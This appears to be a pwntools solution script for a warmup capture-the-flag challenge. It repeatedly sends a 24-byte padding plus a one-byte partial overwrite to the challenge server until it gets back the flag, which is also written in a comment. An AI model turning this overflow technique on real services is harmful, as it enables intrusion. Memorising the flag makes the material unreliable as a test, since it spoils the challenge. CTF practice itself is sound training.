#!/usr/bin/env python3
#maple{buwuffer_owoverflow_UwU}
#python3 solution.py

from pwn import *

while(1):
    p = remote("warmup1.ctf.maplebacon.org", 1337, ssl=False)
    #p = process("./chal")
    #raw_input("attach gdb")

    payload = b"A"*24 + b'\x1d'
    p.send(payload)
   
    flag = p.recvall()
    if(b'maple' in flag):
        print(flag)
        break
    #p.interactive()
